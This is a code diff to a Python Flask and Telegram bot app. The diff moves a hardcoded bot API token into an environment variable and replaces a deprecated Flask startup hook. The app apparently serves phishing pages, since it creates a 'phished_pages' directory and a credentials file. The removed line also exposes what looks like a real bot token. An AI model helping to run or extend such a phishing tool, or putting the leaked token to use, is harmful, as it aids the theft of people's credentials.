@@ -11,13 +11,17 @@ import time
 import logging
 import glob
 import re
+from dotenv import load_dotenv
 
 # Set up logging
 logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
 logger = logging.getLogger(__name__)
 
+load_dotenv()
+
 # Telegram bot API token
-API_TOKEN = '8110718903:AAFlE-nSLZZPXUSmkYdEmCc69ZvIXp7iy_k'
+
+API_TOKEN = os.getenv("API_TOKEN")
 bot = telebot.TeleBot(API_TOKEN)  # Initialize Telegram bot
 app = Flask(__name__, static_folder=None)  # Disable default static folder
 
@@ -62,12 +66,19 @@ user_states = {}
 
 
 # Ensure the directories exist
-@app.before_first_request
+# Replace this:
+
+# With this modern approach:
 def create_directories():
     base_dir = os.path.abspath(os.path.dirname(__file__))
     os.makedirs(os.path.join(base_dir, "phished_pages"), exist_ok=True)
     os.makedirs(os.path.join(base_dir, TEMPLATES_DIR), exist_ok=True)
     initialize_creds_file()
+
+# Then add this to register the function with Flask
+with app.app_context():
+    create_directories()
+
 
 
 # Root route - Simple confirmation that the server is running
